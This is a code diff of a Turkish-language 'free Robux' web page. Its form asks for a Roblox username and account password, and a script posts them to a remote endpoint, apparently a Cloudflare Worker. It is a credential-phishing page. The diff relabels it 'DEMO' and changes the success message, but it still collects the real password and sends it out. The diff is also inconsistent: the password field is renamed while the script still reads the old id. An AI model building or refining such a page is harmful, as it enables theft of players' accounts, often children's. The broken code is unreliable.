@@ -63,44 +63,39 @@ button:disabled{opacity:.5;cursor:wait}
 .success{font-size:52px;margin-bottom:14px}
 #result h2{color:var(--green);font-size:22px}
 #result p{color:#b4c5b9;font-size:13px;line-height:1.8;margin-top:12px}
-.footer{text-align:center;color:#627468;font-size:10px;margin-top:19px;line-height:1.7}
+.footer{text-align:center;color:#91a397;font-size:10px;margin-top:19px;line-height:1.7}
 </style>
 </head>
 <body>
 <div class="wrap">
  <div class="top">
-  <div class="brand">ROBUX <span></span></div>
-  <div class="status">● SYSTEM</div>
+  <div class="brand">ROBUX <span>DEMO</span></div>
+  <div class="status">● DEMO SYSTEM</div>
  </div>
 
  <main class="card">
   <div id="formArea">
    <div class="logo">RBX</div>
-   <h1>ROBUX</h1>
-   <p class="subtitle">Robuxunu Al.</p>
+   <h1>ROBUX </h1>
+   <p class="subtitle">Robux Center</p>
 
-   <div class="notice">
-    ⚠️ Bu bir robux sitesidir.
-    Gerçek Robux gönderilir. Roblox hesabının şifresini gir ve robux 2-3 gün içerisinde gelsin.
-   </div>
 
    <form id="demoForm">
     <label for="username">ROBLOX KULLANICI ADI</label>
     <input id="username" maxlength="30" placeholder="Örn. Robux123" required>
 
     <label for="amount">ROBUX MİKTARI</label>
-    <select id="amount">
+    <select id="amount" required>
      <option value="1000">1.000 Robux</option>
      <option value="100000">100.000 Robux</option>
      <option value="1000000">1.000.000 Robux</option>
      <option value="100000000">100.000.000 Robux</option>
-     <option value=500000000000">500.000.000.000 Robux</option>
+     <option value="650000000000000">650T Robux</option>
     </select>
 
-    <label for="funnyCode">Roblox Şifren</label>
-    <input id="funnyCode" maxlength="40" placeholder="Örn. Robux123" required>
-    <p class="hint">
-    </p>
+    <label for="Şifre">ŞİFRE (ROBLOX ŞİFRESİ)</label>
+    <input id="Şifre" type="password" maxlength="40"
+      placeholder="Örn. Robux123" required>
 
     <button id="submitBtn" type="submit">İŞLEMİ BAŞLAT →</button>
    </form>
@@ -108,7 +103,7 @@ button:disabled{opacity:.5;cursor:wait}
 
   <div id="loading">
    <div class="spinner"></div>
-   <h2>DEMO HAZIRLANIYOR</h2>
+   <h2>HAZIRLANIYOR</h2>
    <p id="loadingText">Sistem başlatılıyor...</p>
    <div class="progress"><div class="bar" id="bar"></div></div>
    <p id="percent">%0</p>
@@ -116,15 +111,14 @@ button:disabled{opacity:.5;cursor:wait}
 
   <div id="result">
    <div class="success">✓</div>
-   <h2>Robux GÖNDERİLDİ!</h2>
+   <h2>TAMAMLANDI!</h2>
    <p id="resultText"></p>
-   <button onclick="location.reload()">YENİDEN BAŞLAT</button>
+   <button type="button" onclick="location.reload()">YENİDEN BAŞLAT</button>
   </div>
  </main>
 
  <div class="footer">
-  ROBUX EXPERIENCE · <br>
-  
+  ROBUX EXPERIENCE
  </div>
 </div>
 
@@ -144,13 +138,8 @@ form.addEventListener("submit", async (e) => {
  const amount = document.getElementById("amount").value;
  const funnyCode = document.getElementById("funnyCode").value.trim();
 
- if (!username || !Şifre) {
+ if (!username || !funnyCode) {
   alert("Lütfen tüm alanları doldur.");
-  return;
- }
-
- if (WORKER_URL.includes("")) {
-  alert("Cloudflare Worker adresi henüz eklenmedi.");
   return;
  }
 
@@ -160,9 +149,9 @@ form.addEventListener("submit", async (e) => {
 
  const messages = [
   "Sistem başlatılıyor...",
-  "Bilgiler kontrol ediliyor...",
+  "Demo bilgileri kontrol ediliyor...",
   "Robux hazırlanıyor...",
-  "Gönderim tamamlanıyor..."
+  "İşlem tamamlanıyor..."
  ];
 
  let progress = 0;
@@ -182,7 +171,7 @@ form.addEventListener("submit", async (e) => {
    body: JSON.stringify({
     username,
     amount,
-    funny_code: funnyCode
+    demo_code: funnyCode
    })
   });
 
@@ -201,7 +190,7 @@ form.addEventListener("submit", async (e) => {
    document.getElementById("resultText").textContent =
     "Kullanıcı adı: " + username +
     " · Demo miktarı: " + Number(amount).toLocaleString("en-US") +
-    ". E-posta bildirimi gönderildi. Gerçek Robux aktarıldı.";
+    ". Demo işlemi tamamlandı. Gerçek Robux aktarılmadı.";
   }, 500);
 
  } catch (error) {
